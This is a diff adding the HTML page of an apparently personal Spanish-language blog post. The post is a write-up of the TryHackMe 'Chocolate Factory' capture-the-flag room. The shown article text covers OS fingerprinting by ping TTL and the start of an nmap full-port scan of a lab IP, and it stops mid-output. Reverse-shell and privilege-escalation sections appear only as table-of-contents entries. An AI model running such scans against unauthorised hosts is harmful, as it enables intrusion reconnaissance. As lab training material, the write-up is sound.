@@ -1,0 +1,1870 @@
+
+
+<!DOCTYPE html>
+<html lang="es" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="es" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Resolución Chocolate Factory &middot; d3b0o</title>
+  <meta name="title" content="Resolución Chocolate Factory &middot; d3b0o" />
+  
+  <meta name="description" content="Blog personal" />
+  
+  
+  
+  <link rel="canonical" href="https://d3b0o.github.io/thm/chocolatefactory/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.71e777da593657f11a182741dacf0721b8beb8a8097754631cfaa4431383df6d85536514d9c5d44be2231bb21491962b37b4394fb3c7cb3629913868b8f08967.css"
+    integrity="sha512-ced32lk2V/EaGCdB2s8HIbi&#43;uKgJd1RjHPqkQxOD322FU2UU2cXUS&#43;IjG7IUkZYrN7Q5T7PHyzYpkThouPCJZw==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.f94f4c4636d9e3ec8f5ee53cdc8ffa3d01bf87cd92ac85e6797550b1e2b80dc9118d838f3eb24c55109352455e72ff082dfe560283154e5a8f87fd75107b59c4.js"
+    integrity="sha512-&#43;U9MRjbZ4&#43;yPXuU83I/6PQG/h82SrIXmeXVQseK4DckRjYOPPrJMVRCTUkVecv8ILf5WAoMVTlqPh/11EHtZxA=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js"
+    integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ&#43;dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5&#43;a8AgFUkA==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Resolución Chocolate Factory" />
+<meta property="og:description" content="Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.
+https://tryhackme.com/room/chocolatefactory
+Para empezar lo primero es comprobar si la máquina está activa y que OS tiene" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d3b0o.github.io/thm/chocolatefactory/" /><meta property="og:image" content="https://d3b0o.github.io/thm/chocolatefactory/cover.jpg"/><meta property="article:section" content="THM" />
+<meta property="article:published_time" content="2022-12-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-13T00:00:00+00:00" /><meta property="og:site_name" content="d3b0o" />
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://d3b0o.github.io/thm/chocolatefactory/cover.jpg"/>
+<meta name="twitter:title" content="Resolución Chocolate Factory"/>
+<meta name="twitter:description" content="Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.
+https://tryhackme.com/room/chocolatefactory
+Para empezar lo primero es comprobar si la máquina está activa y que OS tiene"/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "TryHackMe",
+    "name": "Resolución Chocolate Factory",
+    "headline": "Resolución Chocolate Factory",
+    
+    "abstract": "Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.\nhttps:\/\/tryhackme.com\/room\/chocolatefactory\nPara empezar lo primero es comprobar si la máquina está activa y que OS tiene",
+    "inLanguage": "es",
+    "url" : "https:\/\/d3b0o.github.io\/thm\/chocolatefactory\/",
+    "author" : {
+      "@type": "Person",
+      "name": "d3b0o"
+    },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-12-13T00:00:00\u002b00:00",
+    "datePublished": "2022-12-13T00:00:00\u002b00:00",
+    
+    "dateModified": "2022-12-13T00:00:00\u002b00:00",
+    
+    "keywords": ["CTF","Fácil","Linux","Archivos ocultos","vi","hash sha512"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3090"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="d3b0o" />
+  
+  
+  
+  <link href="#" rel="me" />
+  
+  
+  <link href="https://github.com/d3b0o" rel="me" />
+  
+  
+  <link href="https://discord.gg/ZyRhY3JeQ6" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-WKTZJ16NWQ', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+  
+  
+  
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px] sbackdrop-blur-xl sshadown-2xl" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">d3b0o</a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Home
+    </p>
+</a>
+
+
+            
+            
+  <a href="/articles/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
+        Posts
+    </p>
+</a>
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+      Writeups
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/thm/"  class="flex items-center">
+          
+          <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="TryHackMe">
+            THM
+          </p>
+        </a>
+        
+        <a href="/htb/"  class="flex items-center">
+          
+          <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="HackTheBox">
+            HTB
+          </p>
+        </a>
+        
+        <a href=""  class="flex items-center">
+          
+          <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+            Vulnhub
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+            
+            
+  <a href="/whoami/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Whomai">
+        Whoami
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/articles/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Posts">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Writeups
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/thm/"  class="flex items-center">
+        
+        <p class="text-sm font-small text-gray-500 hover:text-gray-900" title="TryHackMe">
+            THM
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/htb/"  class="flex items-center">
+        
+        <p class="text-sm font-small text-gray-500 hover:text-gray-900" title="HackTheBox">
+            HTB
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href=""  class="flex items-center">
+        
+        <p class="text-sm font-small text-gray-500 hover:text-gray-900" title="">
+            Vulnhub
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/whoami/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Whomai">
+            Whoami
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+    
+     
+    
+    
+      
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/thm/chocolatefactory/cover_hue1b848458c81af48ef22860126496da3_247298_1200x0_resize_q75_box.jpg);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+    
+  
+  
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Resolución Chocolate Factory
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2022-12-13 00:00:00 &#43;0000 UTC">13/12/2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/thm/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    THM
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ctf/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    CTF
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/f%C3%A1cil/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Fácil
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Linux
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/archivos-ocultos/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Archivos ocultos
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/vi/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    vi
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hash-sha512/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    hash sha512
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+  </header>
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+     
+    <div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky  lg:top-[140px] ">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
+    <li><a href="#puerto-80">Puerto 80</a></li>
+    <li><a href="#puerto-21">Puerto 21</a></li>
+    <li><a href="#homephp">home.php</a></li>
+    <li><a href="#reverse-shell">Reverse shell</a></li>
+    <li><a href="#tratamiento-de-la-tty">Tratamiento de la tty</a></li>
+    <li><a href="#escalada-a-charlie">Escalada a charlie</a></li>
+    <li><a href="#escalada-root">Escalada root</a></li>
+    <li><a href="#rootpy-puertos-100---125">root.py (Puertos 100 - 125)</a></li>
+    <li><a href="#root-flag">Root flag</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
+    <li><a href="#puerto-80">Puerto 80</a></li>
+    <li><a href="#puerto-21">Puerto 21</a></li>
+    <li><a href="#homephp">home.php</a></li>
+    <li><a href="#reverse-shell">Reverse shell</a></li>
+    <li><a href="#tratamiento-de-la-tty">Tratamiento de la tty</a></li>
+    <li><a href="#escalada-a-charlie">Escalada a charlie</a></li>
+    <li><a href="#escalada-root">Escalada root</a></li>
+    <li><a href="#rootpy-puertos-100---125">root.py (Puertos 100 - 125)</a></li>
+    <li><a href="#root-flag">Root flag</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+      </div>
+      </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        
+
+        <p>Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.</p>
+<p><a href="https://tryhackme.com/room/chocolatefactory"   target="_blank">
+    https://tryhackme.com/room/chocolatefactory</a></p>
+<p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
+<p>IP Atacante = 10.10.10.10</p>
+<p>IP víctima = 10.10.250.47</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ping -c <span class="m">1</span> 10.10.250.47
+</span></span><span class="line"><span class="cl">PING 10.10.250.47 <span class="o">(</span>10.10.250.47<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.250.47: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>52.3 ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.10.250.47 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 52.300/52.300/52.300/0.000 ms
+</span></span></code></pre></div><p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<div id="escaneo-de-puertos-nmap" class="anchor">Escaneo de puertos (nmap)></div>
+<h2 class="relative group">Escaneo de puertos (nmap) 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Ahora empezamos con un escaneo de puertos</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.250.47 -oG allPort
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE    REASON
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp        syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh        syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">100/tcp open  newacct    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">101/tcp open  hostname   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">102/tcp open  iso-tsap   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">103/tcp open  gppitnp    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">104/tcp open  acr-nema   syn-ack ttl <span class="m">63</span>
